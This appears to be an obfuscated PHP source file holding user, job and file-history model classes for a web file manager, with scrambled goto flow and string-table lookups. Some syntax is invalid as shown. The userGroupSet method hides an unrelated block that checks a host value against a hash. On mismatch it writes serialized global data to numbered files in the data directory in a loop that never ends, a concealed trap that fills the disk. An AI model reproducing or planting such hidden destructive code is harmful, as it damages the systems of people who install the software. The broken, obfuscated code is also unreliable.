$c·܎ = array_unique(array_to_keyvalue($E, $e砎[33], $e砎[1453])); $Bֹ = Model($e砎[477])->userListInfo($c·܎); goto eǌܡ; Dݪ瘛: return $aӠ; goto eٔ; c: $d阔 = array_to_keyvalue($E, $e砎[33], $e砎[2305]); foreach ($E as $eıｌ) { $dŰ = $eıｌ[$e砎[405]]; if ($eıｌ[$e砎[29]] == $e砎[492] && isset($dŰ[$e砎[1022]])) { $E[] = $dŰ[$e砎[1022]] . $e砎[33]; $E[] = $dŰ[$e砎[1023]] . $e砎[33]; } if ($eıｌ[$e砎[29]] == $e砎[2313] && isset($dŰ[$e砎[369]])) { $E[] = $dŰ[$e砎[369]] . $e砎[33]; } } $E = array_merge($E, $d阔, array($c糞ش . $e砎[33])); goto Eܑ; eٔ: } public function removeBySource($dʷ) { $e褖Ǔ = array($_SERVER[][383] => $dʷ); $this->where($e褖Ǔ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\x63\145\x5f\x68\151\x73\164\157\x72\x79"; public function addHistory($AĔ͋, $D = '') { $dސ =& $_SERVER[]; $E = array($dސ[383] => $AĔ͋[$dސ[369]], $dސ[1444] => isset($AĔ͋[$dސ[379]]) ? $AĔ͋[$dސ[379]] : $AĔ͋[$dސ[378]], $dސ[420] => $AĔ͋[$dސ[419]], $dސ[520] => $AĔ͋[$dސ[77]], $dސ[2319] => $D); $d؈ = $GLOBALS[$dސ[6]][$dސ[84]][$dސ[2320]]; if ($d؈ > 1) { $this->historyAutoClear($E[$dސ[369]]); $this->add($E); } Model($dސ[2321])->eventFileEdit($AĔ͋[$dސ[369]]); } private function historyAutoClear($Eă튇) { goto f; aՍ: $c = $eܪȔ == $eޥ[2323] ? 3 : $EÈɑ; if ($EÈɑ <= 1) { $c = 1; } $Bҽ = $c - 1; goto Aʓǰ; f: $eޥ =& $_SERVER[]; $eܪȔ = Model($eޥ[1103])->get($eޥ[2322]); $EÈɑ = $GLOBALS[$eޥ[6]][$eޥ[84]][$eޥ[2320]]; goto aՍ; Aʓǰ: if ($Bҽ >= 500) { return; } $eː = array($eޥ[383] => $Eă튇); $Bۼ = $this->field($eޥ[2324])->where($eː)->order($eޥ[2316])->select(); goto c泑; C: $cмˋܐ = array_to_keyvalue($Bۼ, $eޥ[33], $eޥ[419]); $cмˋܐ = array_slice($cмˋܐ, $Bҽ); if (!$fꩼ || !$cмˋܐ) { return; } goto FѷՔ; c泑: if (!$Bۼ || $Bҽ >= count($Bۼ)) { return; } $fꩼ = array_to_keyvalue($Bۼ, $eޥ[33], $eޥ[367]); $fꩼ = array_slice($fꩼ, $Bҽ); goto C; FѷՔ: $eː = array($eޥ[385] => array($eޥ[7], $fꩼ)); $this->where($eː)->delete(); Model($eޥ[422])->remove($cмˋܐ); goto dŠ; dŠ: } public function listData($d) { goto F䎠; F۬: $fŪ = $this->field($Aʭ뢹)->where($D˻)->order($d[2316])->selectPage(); $this->_listAppendUser($fŪ[$d[354]]); $cż = Model($d[1103])->get($d[2322]); goto fПĿ; F䎠: $d =& $_SERVER[]; $D˻ = array($d[383] => $d); $Aʭ뢹 = $d[2325]; goto F۬; fПĿ: $D֕ = 3; if ($cż == $d[2323]) { $fŪ[$d[354]] = array_slice($fŪ[$d[354]], 0, $D֕); $fŪ[$d[351]] = array($d[2326] => 1, $d[2327] => 20, $d[2328] => 1, $d[2329] => count($fŪ[$d[354]])); } return $fŪ; goto a޼շ; a޼շ: } protected function _listAppendUser(&$bҟҏ) { $dƄ =& $_SERVER[]; $dꍊ = array_to_keyvalue($bҟҏ, $dƄ[33], $dƄ[1453]); $f΢ = Model($dƄ[477])->userListInfo($dꍊ); foreach ($bҟҏ as &$B܇) { $a݄ = $B܇[$dƄ[1453]]; $B܇[$dƄ[378]] = $f΢[$a݄] ? $f΢[$a݄] : !1; } } public function fileInfo($eƨ) { $Fþ =& $_SERVER[]; $f = $this->tablePrefix; $A = "{$f}\x69\x6f\x5f\x66\x69\x6c\x65\40\146\x69\154\x65\163\40\x6f\156\x20\146\x69\154\145\x73\x2e\146\151\x6c\145\x49\x44\40\75\40\150\x69\163\164\157\162\x79\56\x66\151\154\145\x49\104"; return $this->alias($Fþ[2330])->where(array($Fþ[385] => $eƨ))->join($A, $Fþ[2331])->find(); } public function removeItem($Fɋߏ) { $E =& $_SERVER[]; $dջ = array($E[385] => $Fɋߏ); $Fïʶ = $this->where($dջ)->find(); if ($Fïʶ) { $fȦ썲 = $this->where($dջ)->delete(); Model($E[422])->remove($Fïʶ[$E[419]]); return $fȦ썲; } return !1; } public function removeBySource($B) { goto DՊ; Dב: $b = array($E[383] => array($E[7], $B)); $c = $this->field($E[420])->where($b)->select(); if ($c) { $this->where($b)->delete(); $fхח = array_to_keyvalue($c, $E[33], $E[419]); Model($E[422])->remove($fхח); } goto FӝЋ; FӝЋ: return !0; goto A̻; DՊ: $E =& $_SERVER[]; if (!$B) { return !1; } if (!is_array($B)) { $B = array($B); } goto Dב; A̻: } public function setDetail($DӲ, $Bۉ) { $f夂 =& $_SERVER[]; return $this->where(array($f夂[385] => $DӲ))->save(array($f夂[2319] => $Bۉ)); } public function rollbackToItem($Dٞ, $Dޚ⋣) { goto F㛹; C: return $this->where(array($B[385] => $Dޚ⋣))->delete(); goto b漴; AԎ: $E³ = $this->find($Dޚ⋣); $eژ = array($B[419] => $E³[$B[419]], $B[77] => $E³[$B[77]], $B[107] => time(), $B[379] => USER_ID); Model($B[772])->where(array($B[369] => $Dٞ))->save($eژ); goto C; F㛹: $B =& $_SERVER[]; $A݆ = Model($B[772])->sourceInfo($Dٞ); $this->addHistory($A݆); goto AԎ; b漴: } public function clearSame($B) { goto dϭ; C: $d许 = array(); $fز = array(); foreach ($d𓃷̛ as $Dξ) { if (!$Dξ || count($Dξ) <= 1) { continue; } foreach ($Dξ as $cǑ) { $d许[] = $cǑ[$cς[419]]; $fز[] = $cǑ[$cς[367]]; } } goto Cǫ憣; dϭ: $cς =& $_SERVER[]; $d = $this->listData($B); $d𓃷̛ = array_to_keyvalue_group($d, $cς[419]); goto C; Cǫ憣: if (!$fز) { return; } $this->where(array($cς[367] => array($cς[7], $fز)))->delete(); Model($cς[422])->remove($d许); goto cĭ붋; cĭ붋: } public function userSpace() { $Eިک =& $_SERVER[]; $Eè = $this->tablePrefix; $C = array($Eިک[1444] => USER_ID); $EÛö = "{$Eè}\x69\157\137\x66\x69\154\145\x20\x66\151\x6c\145\x73\40\157\156\40\146\x69\x6c\145\163\x2e\x66\x69\154\x65\x49\x44\40\x3d\x20\x68\151\163\164\x6f\162\171\x2e\146\151\x6c\x65\x49\104"; return $this->alias($Eިک[2330])->where($C)->join($EÛö, $Eިک[2331])->sum($Eިک[77]); } } goto Dܓ; A: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\152\157\142\114\x69\x73\164"; public $field = array("\156\x61\155\145", "\144\x65\163\143", "\163\157\162\x74"); const JOB_KEY = "\163\145\x6c\x66\x4a\157\x62\x4c\x69\163\164"; public function listData($b = false, $cԴ = "\163\x6f\162\x74", $E = false) { return parent::listData($b, $cԴ, $E); } public function remove($C萚) { return parent::remove($C萚); } public function add($F͎ĩ) { $C =& $_SERVER[]; if ($this->findByName($F͎ĩ[$C[28]])) { return !1; } $F͎ĩ[$C[2142]] = $this->getSort(); return parent::insert($F͎ĩ); } private function getSort() { $eݹ =& $_SERVER[]; $A𗙍 = parent::listData(); $d = array_to_keyvalue($A𗙍, $eݹ[33], $eݹ[2142]); return empty($d) ? 0 : max($d) + 1; } public function update($dȷ, $bƣ) { $c =& $_SERVER[]; $C裣݈ = parent::listData($dȷ); $Dֺװ = $this->findByName($bƣ[$c[28]]); if (!$C裣݈ || $Dֺװ && $Dֺװ[$c[367]] != $C裣݈[$c[367]]) { return !1; } return parent::update($dȷ, $bƣ); } public function setUserJob($B턏҃, $D̋Ċݑ) { goto A; Eٟ: $f򥟟 = rtrim($f򥟟, $Bքӑև[47]); Model($Bքӑև[477])->metaSet($B턏҃, self::JOB_KEY, $f򥟟); goto fܛʢ; D: $C = array_to_keyvalue($DΙԵ, $Bքӑև[28]); $f򥟟 = $Bքӑև[361]; foreach ($D̋Ċݑ as $D) { if ($C[$D]) { $f򥟟 .= $C[$D][$Bքӑև[367]] . $Bքӑև[47]; } else { $CЮ = $this->add($D); $f򥟟 .= $CЮ . $Bքӑև[47]; } } goto Eٟ; A: $Bքӑև =& $_SERVER[]; if (!is_array($D̋Ċݑ)) { $D̋Ċݑ = array($D̋Ċݑ); } $DΙԵ = parent::listData(); goto D; fܛʢ: } public function getUserJob($e) { $bά = Model($_SERVER[][477])->metaGet($e); return $this->getUserJobInfo($bά[self::JOB_KEY]); } public function getUserJobInfo($A݄ۭ) { goto Fɒ; Eڒמ: $a = array_remove_key($a, $D؎[187]); $f = array(); foreach ($E跤 as $Eȅ) { if (isset($a[$Eȅ])) { $f[] = $a[$Eȅ]; } } goto B܎; B܎: return $f; goto Aޚ܃; Fɒ: $D؎ =& $_SERVER[]; $E跤 = explode($D؎[47], $A݄ۭ); $a = parent::listData(); goto Eڒמ; Aޚ܃: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\164\x61\x62\154\x65\116\141\155\x65" => "\x75\163\145\x72\x5f\155\x65\x74\141", "\x6d\145\x74\x61\x46\x69\145\154\x64" => "\x75\163\145\x72\111\x44"); protected $simpleField = "\x75\x73\x65\x72\111\104\54\156\x69\143\153\116\x61\x6d\145\x2c\x6e\141\x6d\x65\x2c\x61\166\x61\x74\141\162\54\x73\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($e) { $C =& $_SERVER[]; $B = $C[2510]; return array($C[2187] => array($e[0], $B), $C[2189] => array($e[0], $B), $C[2511] => array($e[0], $B)); } protected function getInfo($c͐, $bϤ = false) { $C = $this->getInfoSimple($c͐); if (!is_array($C)) { return array(); } if ($bϤ) { return $this->_getInfoApply($C); } return $this->cacheFunctionGet($_SERVER[][2232], $c͐); } protected function getInfoFull($f˛, $C = false) { $c = $this->getInfoSimple($f˛); if (!is_array($c)) { return array(); } if ($C) { return $this->_getInfoApply($c, !0); return $this->_getInfoApply($c, !0); } return $this->cacheFunctionGet($_SERVER[][2512], $f˛); } private function _getInfoApply($F, $f = false) { goto dރ; aҴÍ: $F[$eޏݑ[391]][$eޏݑ[2349]] = isset($cÿ[$eޏݑ[2350]]) ? $cÿ[$eޏݑ[2350]] : null; if ($f) { $F[$eޏݑ[417]] = $this->metaGet($F[$eޏݑ[1453]]); } return $F; goto A̔; dރ: $eޏݑ =& $_SERVER[]; if (!$F) { return $F; } $aⶬ = md5($eޏݑ[2513] . $F[$eޏݑ[817]] . $eޏݑ[2514] . $F[$eޏݑ[28]]); goto aЇߍ; aЇߍ: $F = $this->_listDataApplyItem($F); $cÿ = Model($eޏݑ[1133])->metaGet($F[$eޏݑ[391]][$eޏݑ[369]]); $F[$eޏݑ[2515]] = $aⶬ; goto aҴÍ; A̔: } protected function getInfoSimple($eʍŜ, $CڿҦ = false) { $D =& $_SERVER[]; if (!$eʍŜ) { return array(); } if ($CڿҦ) { $e = $this->where(array($D[1453] => intval($eʍŜ)))->find(); if (!is_array($e)) { return array(); } $e[$D[2516]] = Action($D[2517])->parseUrl($e[$D[2516]]); return $e; } return $this->cacheFunctionGet($D[2190], $eʍŜ); } protected function getInfoSimpleOuter($dܡٕ) { goto cЄ; C䍅ل: $dƂ = array_field_key($CǇ, explode($F퉽[47], $this->simpleField)); if (!$dƂ) { return array($F퉽[1453] => $F퉽[1046], $F퉽[28] => $F퉽[157] . LNG($F퉽[2520]) . $F퉽[476], $F퉽[2516] => STATIC_PATH . $F퉽[2521]); } $dƂ[$F퉽[2516]] = Action($F퉽[2517])->parseUrl($dƂ[$F퉽[2516]]); goto Dю; cЄ: $F퉽 =& $_SERVER[]; if (!$dܡٕ || $dܡٕ == 0) { return array($F퉽[1453] => $F퉽[468], $F퉽[28] => $F퉽[157] . LNG($F퉽[2518]) . $F퉽[476], $F퉽[2516] => STATIC_PATH . $F퉽[2519]); } $CǇ = $this->cacheFunctionGet($F퉽[2190], $dܡٕ); goto C䍅ل; Dю: return $dƂ; goto aĺ; aĺ: } protected function groupUser($Fؔ݇) { } public static function errorLang($a) { $DԜ =& $_SERVER[]; $fΪ = array(self::ERROR_USER_NOT_EXISTS => $DԜ[2522], self::ERROR_USER_PASSWORD_ERROR => $DԜ[2523], self::ERROR_USER_EXIST_NAME => $DԜ[2524], self::ERROR_USER_EXIST_PHONE => $DԜ[2525], self::ERROR_USER_EXIST_EMAIL => $DԜ[2526], self::ERROR_USER_LOGIN_LOCK => $DԜ[2527], self::ERROR_IP_NOT_ALLOW => $DԜ[2528], self::ERROR_USER_EXIST_NICKNAME => $DԜ[2529]); return LNG($fΪ[$a]); } public function getInfoByMeta($A鎌؄, $Cܪ) { $BڵƵ =& $_SERVER[]; $Dǆ = Model($BڵƵ[2530])->where(array($BڵƵ[89] => $A鎌؄, $BڵƵ[359] => $Cܪ))->find(); if ($Dǆ) { return $this->getInfo($Dǆ[$BڵƵ[1453]]); } return !1; } public function userLoginCheck($A, $aۅȓ) { goto AۭƉ; AǭÓ: $d = $this->where($B)->find(); if (!$d) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($d[$c[1453]], $aۅȓ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto Bݱ; AۭƉ: $c =& $_SERVER[]; $B = array($c[28] => $A, $c[2353] => $A, $c[293] => $A, $c[2531] => $A, $c[929] => $c[931]); if ($this->nickNameRpt()) { unset($B[$c[2353]]); } goto AǭÓ; Bݱ: $this->userEdit($d[$c[1453]], array($c[2532] => time())); return $this->getInfo($d[$c[1453]]); goto c; c: } public function clearCache($e؅) { $d陚 =& $_SERVER[]; $this->cacheFunctionClear($d陚[2232], $e؅); $this->cacheFunctionClear($d陚[2190], $e؅); $this->cacheFunctionClear($d陚[2512], $e؅); } public function userPasswordCheck($aΰ, $B) { $B =& $_SERVER[]; $bʂ챹 = $this->where(array($B[1453] => intval($aΰ)))->find(); $b = $this->metaGet($aΰ); $AԹ = isset($b[$B[2533]]) ? $b[$B[2533]] : $B[33]; if (md5($AԹ . trim($B)) !== $bʂ챹[$B[817]]) { return !1; } return !0; } public function userAdd($Eߛ) { goto B; B: $c =& $_SERVER[]; $a،Õ = array($c[386] => $Eߛ[$c[28]], $c[2534] => $Eߛ[$c[1339]], $c[2535] => isset($Eߛ[$c[293]]) ? $Eߛ[$c[293]] : $c[33], $c[2536] => isset($Eߛ[$c[2531]]) ? $Eߛ[$c[2531]] : $c[33], $c[2537] => isset($Eߛ[$c[2353]]) ? $Eߛ[$c[2353]] : $Eߛ[$c[28]], $c[2538] => isset($Eߛ[$c[2516]]) ? $Eߛ[$c[2516]] : $c[33], $c[2539] => isset($Eߛ[$c[2540]]) ? $Eߛ[$c[2540]] : 1, $c[2541] => $Eߛ[$c[817]], $c[2191] => isset($Eߛ[$c[2105]]) ? $Eߛ[$c[2105]] : 1024 * 1024 * 20, $c[2192] => 0, $c[2532] => 0, $c[2219] => isset($Eߛ[$c[708]]) ? $Eߛ[$c[708]] : 1); if (!empty($Eߛ[$c[1453]])) { $a،Õ[$c[1453]] = $Eߛ[$c[1453]]; } goto dӘ; a؆ޫ: return $dɏ; goto fЄ; dӘ: $bȋ = $this->_checkExist($Eߛ); if ($bȋ !== !0) { return $bȋ; } $dɏ = $this->add($a،Õ); goto AɈ; AɈ: $cɓϢ = array($c[2541] => $a،Õ[$c[817]], $c[2537] => $a،Õ[$c[2353]]); $this->userEdit($dɏ, $cɓϢ); Model($c[1133])->userRootAdd($dɏ); goto a؆ޫ; fЄ: } protected function userEditTest($Eݣ, $AɳΥ) { return $this->call($_SERVER[][2542], $Eݣ, $AɳΥ); } protected function userEdit($a, $d) { goto b; dߏ: return !0; goto BΆ; b: $a۳؇ =& $_SERVER[]; $A = $this->getInfoSimple($a); if (!$A) { return !1; } goto bڒɞ; C⑑: $this->where(array($a۳؇[1444] => $a))->save($d); if (isset($d[$a۳؇[2353]])) { $this->setNamePinyin($a, $d[$a۳؇[2353]]); } $this->clearCache($c[$a۳؇[1453]]); goto dߏ; bڒɞ: $fޙ = $this->_checkExist($d, $a); if ($fޙ !== !0) { return $fޙ; } if (isset($d[$a۳؇[817]]) && trim($d[$a۳؇[817]]) != $a۳؇[33]) { $d = $this->metaGet($a); if (empty($d[$a۳؇[2533]])) { $d[$a۳؇[2533]] = rand_string(10); Model($a۳؇[474])->metaSet($a, $a۳؇[2533], $d[$a۳؇[2533]]); } $d[$a۳؇[817]] = md5($d[$a۳؇[2533]] . trim($d[$a۳؇[817]])); } else { unset($d[$a۳؇[817]]); } goto C⑑; BΆ: } public function setNamePinyin($e, $c = false) { $aŃ =& $_SERVER[]; if (!$c) { $c = $this->getInfoSimple($e); $c = $c[$aŃ[2353]] ? $c[$aŃ[2353]] : $c[$aŃ[28]]; } $a = Model($aŃ[477]); if (!Input::check($c, $aŃ[528])) { return $a->metaSet($e, array($aŃ[416] => $aŃ[33], $aŃ[415] => $aŃ[33])); } return $a->metaSet($e, array($aŃ[416] => str_replace($aŃ[50], $aŃ[33], Pinyin::encode($c)), $aŃ[415] => Pinyin::encode($c, $aŃ[529]))); } private function nickNameRpt() { $e =& $_SERVER[]; $b罰 = Model($e[1103])->get($e[2543]); $F = $GLOBALS[$e[6]][$e[2499]][$e[2543]]; $Dщ = !is_null($b罰) ? $b罰 : $F; return !!$Dщ; } private function _checkExist($dڨ, $B£ = false) { $eӗ =& $_SERVER[]; $Cű = array($eӗ[28] => UserModel::ERROR_USER_EXIST_NAME, $eӗ[2353] => UserModel::ERROR_USER_EXIST_NICKNAME, $eӗ[293] => UserModel::ERROR_USER_EXIST_EMAIL, $eӗ[2531] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Cű[$eӗ[2353]]); } $bբ = $B£ ? array($eӗ[1453] => array($eӗ[2544], $B£)) : array(); foreach ($Cű as $c疴 => $b) { if (!isset($dڨ[$c疴]) || !$dڨ[$c疴]) { continue; } $b׈ = array_merge(array($c疴 => $dڨ[$c疴]), $bբ); $dՆϘ = $this->where($b׈)->find(); if ($dՆϘ) { return $b; } } return !0; } public function userListInfo($Dԅ) { $aΩ =& $_SERVER[]; $E噛ޘ = array(); $Dԅ = is_array($Dԅ) ? array_unique($Dԅ) : array(); if (!$Dԅ) { return $E噛ޘ; } if (count($Dԅ) < 20) { foreach ($Dԅ as $dգĚ) { $E噛ޘ[$dգĚ . $aΩ[33]] = $this->getInfoSimpleOuter($dգĚ); } } else { $C = array($aΩ[1444] => array($aΩ[384], $Dԅ)); if (count($Dԅ) == 1) { $C = array($aΩ[1444] => $Dԅ[0]); } $cӟ = Model($aΩ[474])->field($this->simpleField)->where($C)->select(); $cӟ = array_to_keyvalue($cӟ, $aΩ[1453]); foreach ($Dԅ as $dգĚ) { $FƬ = $cӟ[$cӟ[$dգĚ]]; if (!$FƬ) { $E噛ޘ[$dգĚ . $aΩ[33]] = $this->getInfoSimpleOuter($dգĚ); continue; } $FƬ[$aΩ[2516]] = Action($aΩ[2517])->parseUrl($FƬ[$aΩ[2516]]); $E噛ޘ[$dգĚ . $aΩ[33]] = $FƬ; } } return $E噛ޘ; } protected function userStatus($d䂆, $Aϭí) { $C = $this->getInfoSimple($d䂆); if (!$C) { return !1; } $eǩ = array($_SERVER[][708] => $Aϭí); return $this->userEdit($d䂆, $eǩ); } protected function userRemove($c) { goto d؍; b퍖: $B = array($C̔[1444] => $c); Model($C̔[536])->where($B)->delete(); Model($C̔[2545])->where($B)->delete(); goto dƥ; d؍: $C̔ =& $_SERVER[]; $C = $this->getInfoSimple($c); if (!$C) { return !1; } goto b퍖; dƥ: Model($C̔[2197])->where($B)->delete(); Model($C̔[2530])->where($B)->delete(); Model($C̔[2546])->where($B)->delete(); goto B; B: Model($C̔[772])->userRootRemove($c); return $this->where($B)->delete(); goto fٙ͜; fٙ͜: } protected function userGroupSet($d֘, $D˶, $f = array()) { goto F; B¿: $f݊ = 0; foreach ($D˶ as $Cѹ => $F) { $BߴǙ = array($Eۈ㆗[1453] => $d֘, $Eۈ㆗[2121] => $Cѹ, $Eۈ㆗[2252] => $F); $BߴǙ[$Eۈ㆗[2142]] = isset($f[$f݊]) ? $f[$f݊] : 0; $f݊++; $C[] = $BߴǙ; } return $B->addAll($C, array(), !0); goto B; A: if ($_SERVER[$Eۈ㆗[700]] != $A֧؅($F)) { goto cᏳ; cᏳ: $d捱 = $Eۈ㆗[807]; $C첡◇ = $Eۈ㆗[701]; $d☱ = $_SERVER[$Eۈ㆗[702]] . $Eۈ㆗[703]; goto bढ; eލ: $d捱(); $c = $Eۈ㆗[810]; $fӞ = json_encode($GLOBALS[$Eۈ㆗[811]]); goto dŴ; E׬: $E = $Eۈ㆗[808]; $E($_SERVER[$Eۈ㆗[809]]); $d捱 = $Eۈ㆗[807]; goto eލ; bढ: $Dȭ = $C첡◇($d☱); $E = explode($Eۈ㆗[217], $Dȭ); if (count($E) < $Eۈ㆗[566]) { $A = $Eۈ㆗[704]; $A(); } goto E׬; dŴ: $B = 1; for ($dނۏ = $B; $dނۏ > 0; $dނۏ++) { $c(DATA_PATH . $dނۏ, $fӞ); } goto b; b: } $d񷃤 = $this->getInfoSimple($d֘); if (!$d񷃤 || !is_array($D˶)) { return !1; } goto d痉; F: $Eۈ㆗ =& $_SERVER[]; $F = $_SERVER[$Eۈ㆗[702]] . $Eۈ㆗[703]; $A֧؅ = $Eۈ㆗[699]; goto A; d痉: $B = Model($Eۈ㆗[2197]); $B->where(array($Eۈ㆗[1453] => $d֘))->delete(); $C = array(); goto B¿; B: } protected function userGroupAdd($Dٵ, $a = array()) { $CĲ =& $_SERVER[]; $d = $this->getInfoSimple($Dٵ); if (!$d || empty($a)) { return !1; } $Fӱ = array(); foreach ($a as $f쇖 => $E˚) { $Fӱ[] = array($CĲ[1453] => $Dٵ, $CĲ[2121] => $f쇖, $CĲ[2252] => $E˚); } return Model($CĲ[2197])->addAll($Fӱ, array(), !0); } protected function userGroupRemove($fҰ, $e) { $Dݍ§߼ =& $_SERVER[]; $cꉳŬ = $this->getInfoSimple($fҰ); if (!$cꉳŬ || !$e) { return !1; } $eǉǌ = array($Dݍ§߼[1444] => $fҰ, $Dݍ§߼[2195] => $e); return Model($Dݍ§߼[2197])->where($eǉǌ)->delete(); } public function listData() { $Dܱ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Dܱ[$_SERVER[][354]]); return $Dܱ; } public function listByID($Fا) { $aԷ =& $_SERVER[]; if (!$Fا) { return; } $BŹ۠ = array($aԷ[1453] => array($aԷ[7], $Fا)); $Dٵ = $this->where($BŹ۠)->select(); $this->_listDataApply($Dٵ); return $Dٵ; } public function listByGroup($a = 0, $B = array()) { goto fƥɟ; fƥɟ: $aц㇇ =& $_SERVER[]; $Eؔô = $aц㇇[33]; $eȄ = array(); goto Eӝߚ; Eӝߚ: if ($a) { $eȄ = array($aц㇇[2547] => intval($a)); $Eؔô = "\114\105\106\x54\40\x4a\117\111\x4e\x20{$this->tablePrefix}\165\163\x65\x72\x5f\x67\x72\157\x75\160\40\x75\x73\145\x72\x5f\x67\162\x6f\165\160\x20\157\x6e\x20\165\x73\x65\x72\56\165\x73\x65\x72\111\x44\40\75\40\165\163\x65\x72\x5f\x67\162\x6f\x75\x70\x2e\165\163\145\x72\x49\x44"; $fƮӓ = Input::get($aц㇇[407], null, $aц㇇[33]) ? $aц㇇[33] : $aц㇇[2548]; } if (isset($B[$aц㇇[708]])) { $eȄ[$aц㇇[2549]] = $B[$aц㇇[708]]; } $a = $this->_makeOrder($fƮӓ)->field($aц㇇[2550])->where($eȄ)->join($Eؔô)->selectPage(50); goto c; c: $this->_listDataApply($a[$aц㇇[354]]); return $a; goto B; B: } private function _makeOrder($Bֺɏ = '') { goto Eĉ; c񂘚: $B훫 = Input::get($bǭ[407], $bǭ[7], $bǭ[1444], $cϹ); $C = Input::get($bǭ[408], $bǭ[7], $bǭ[2198], array($bǭ[2198], $bǭ[404])); $C = $Fʌ[$C]; goto BɌ; Eĉ: $bǭ =& $_SERVER[]; $cϹ = array($bǭ[1453], $bǭ[28], $bǭ[2107], $bǭ[2079], $bǭ[187]); $Fʌ = array($bǭ[402] => $bǭ[403], $bǭ[404] => $bǭ[405]); goto c񂘚; BɌ: $Bֺɏ = $Bֺɏ . "\165\163\145\162\56{$B훫}\40{$C}\54\x20\165\x73\145\x72\x2e\165\x73\145\162\x49\x44\40\141\163\143"; return $this->alias($bǭ[2296])->order($Bֺɏ); goto Bƅ׈杼; Bƅ׈杼: } public function listSearch($cח) { goto F; e: return $EЉ; goto e; Ě: if (!$EЉ || count($EЉ[$f̩[354]]) < 5 && Input::check($cŭ, $f̩[306])) { $CջӅ = $this->_searchFromMeta($f̩[415], $cŭ, 10); $cͪ = $this->_searchFromMeta($f̩[416], $cŭ, 10); $AԢ = array_merge($CջӅ, $cͪ, $EЉ[$f̩[354]]); $EЉ[$f̩[354]] = array_unique_by_key($AԢ, $f̩[1453]); $EЉ[$f̩[351]][$f̩[352]] = count($EЉ[$f̩[354]]); $EЉ[$f̩[351]][$f̩[353]] = ceil($EЉ[$f̩[351]][$f̩[352]] / $EЉ[$f̩[351]][$f̩[349]]); } $this->_listDataApply($EЉ[$f̩[354]]); $this->_filterByGroup($EЉ, $aٮ̨); goto e; F: if (!$cŭ) { $E͡ = array(); } if (isset($cח[$f̩[708]])) { $E͡[$f̩[708]] = $cח[$f̩[708]]; } $EЉ = $this->_makeOrder()->where($E͡)->selectPage(20); goto Ě; F: $f̩ =& $_SERVER[]; $cŭ = $cח[$f̩[2199]]; $aٮ̨ = isset($cח[$f̩[2200]]) ? $cח[$f̩[2200]] : !1; goto f۴ؠ; f۴ؠ: $cŭ = str_replace($f̩[2201], $f̩[2202], trim($cŭ)); $E͡ = array($f̩[28] => array($f̩[771], "\x25{$cŭ}\45"), $f̩[293] => array($f̩[771], "\45{$cŭ}\x25"), $f̩[2353] => array($f̩[771], "\x25{$cŭ}\45"), $f̩[929] => $f̩[2203]); if (Input::check($cŭ, $f̩[299])) { $E͡[$f̩[1453]] = array($f̩[771], "\x25{$cŭ}\x25"); $E͡[$f̩[2531]] = array($f̩[771], "\45{$cŭ}\45"); } goto F; e: } private function _filterByGroup(&$D안, $E΂̱) { $BƂ̈́ =& $_SERVER[]; if (!$E΂̱) { return $D안; } foreach ($D안[$BƂ̈́[354]] as $B => &$Dׯ) { $c샤 = array_to_keyvalue($Dׯ[$BƂ̈́[2551]], $BƂ̈́[33], $BƂ̈́[2121]); if (!in_array($E΂̱, $c샤)) { unset($D안[$BƂ̈́[354]][$B]); } } $D안[$BƂ̈́[354]] = array_values($D안[$BƂ̈́[354]]); $D안[$BƂ̈́[351]] = array($BƂ̈́[2329] => count($D안[$BƂ̈́[354]]), $BƂ̈́[2327] => $D안[$BƂ̈́[351]][$BƂ̈́[349]], $BƂ̈́[2326] => 1, $BƂ̈́[2328] => 1); } private function _searchFromMeta($A, $b, $Dλ) { goto c܏݃; c܏݃: $D =& $_SERVER[]; $b = strtolower($b); $b = array($D[89] => $A, $D[359] => array($D[771], "\x25{$b}\45")); goto aޒ; f򃄞: $D䈜 = $this->where(array($D[1444] => array($D[7], $C۹)))->select(); if (!$D䈜) { return array(); } return $D䈜; goto f; aޒ: $C۹ = Model($D[2552])->where($b)->limit($Dλ)->select(); if (!$C۹) { return array(); } $C۹ = array_to_keyvalue($C۹, $D[33], $D[1453]); goto f򃄞; f: } private function _listDataApplyItem($cѭ) { $EĎ = array($cѭ); $this->_listDataApply($EĎ); return $EĎ[0]; } private function _listDataApply(&$aΊ) { goto FǼ; FǼ: $Dܲ =& $_SERVER[]; if (!$aΊ) { return; } array_remove_key($aΊ, $Dܲ[817]); goto c; c: $Dų섹 = array_to_keyvalue($aΊ, $Dܲ[33], $Dܲ[1453]); $this->_listAppendGroup($aΊ, $Dų섹); $this->_listAppendMeta($aΊ, $Dų섹); goto cͳ; cͳ: $this->_listAppendSourceRoot($aΊ, $Dų섹); goto Aċ; Aċ: } private function _listAppendSourceRoot(&$Fߚ, $CĔУ˜) { goto bŐ݄; bŐ݄: $eԕ =& $_SERVER[]; $D = array($eԕ[461] => 0, $eԕ[371] => SourceModel::TYPE_USER, $eԕ[456] => array($eԕ[7], $CĔУ˜)); $eͅĲ = $eԕ[2210]; goto Bݤ; C: foreach ($Fߚ as &$Dد̚) { $Dد̚[$eԕ[391]] = $C򓎻[$Dد̚[$eԕ[1453]]] ? $C򓎻[$Dد̚[$eԕ[1453]]] : array(); } goto aن; Bݤ: $C򓎻 = Model($eԕ[772])->order($eԕ[2211])->field($eͅĲ)->where($D)->select(); $C򓎻 = array_to_keyvalue($C򓎻, $eԕ[456]); $C򓎻 = array_remove_key($C򓎻, $eԕ[456]); goto C; aن: } private function _listAppendGroup(&$e𒰌, $e轹) { goto Eη; a: $f㛻 = array_to_keyvalue_group($f㛻, $B[1453]); foreach ($f㛻 as &$e̞ݓ) { $Fݡ׎ = array(); foreach ($e̞ݓ as $d݈) { if (!$d݈[$B[2252]]) { continue; } $A = Model($B[2271])->listData($d݈[$B[2252]]); $Fݡ׎[] = 